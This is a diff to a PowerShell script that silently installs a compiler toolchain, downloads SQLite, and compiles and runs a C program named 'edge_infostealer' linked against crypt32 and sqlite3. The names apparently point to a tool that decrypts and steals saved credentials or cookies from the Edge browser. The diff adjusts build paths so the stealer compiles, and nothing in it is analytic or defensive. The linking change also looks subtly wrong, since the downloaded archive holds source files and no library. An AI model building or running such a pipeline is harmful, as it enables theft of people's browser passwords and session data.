@@ -9,6 +9,17 @@ Invoke-WebRequest -Uri $w64devkitUrl -OutFile $w64devkitExe
 # Run the w64devkit installer
 Start-Process -FilePath $w64devkitExe -ArgumentList "/SILENT" -Wait
 
+# Define the URL for SQLite amalgamation
+$sqliteUrl = "https://www.sqlite.org/2024/sqlite-amalgamation-3400000.zip"
+$sqliteZip = "sqlite-amalgamation.zip"
+$sqliteDir = "sqlite-amalgamation"
+
+# Download SQLite amalgamation
+Invoke-WebRequest -Uri $sqliteUrl -OutFile $sqliteZip
+
+# Extract SQLite amalgamation
+Expand-Archive -Path $sqliteZip -DestinationPath $sqliteDir
+
 # Define the C program
 $cProgram = @"
 #include <stdio.h>
@@ -90,7 +101,9 @@ Set-Content -Path $cProgramPath -Value $cProgram
 # Compile the C program using w64devkit
 $w64devkitBin = "C:\w64devkit\bin"
 $gccPath = Join-Path -Path $w64devkitBin -ChildPath "gcc.exe"
-$compileCommand = "$gccPath edge_infostealer.c -o edge_infostealer -lcrypt32 -lsqlite3"
+$sqliteInclude = "C:\sqlite-amalgamation"
+$sqliteLib = "C:\sqlite-amalgamation"
+$compileCommand = "$gccPath edge_infostealer.c -o edge_infostealer -I$sqliteInclude -L$sqliteLib -lcrypt32 -lsqlite3"
 Invoke-Expression $compileCommand
 
 # Run the compiled executable
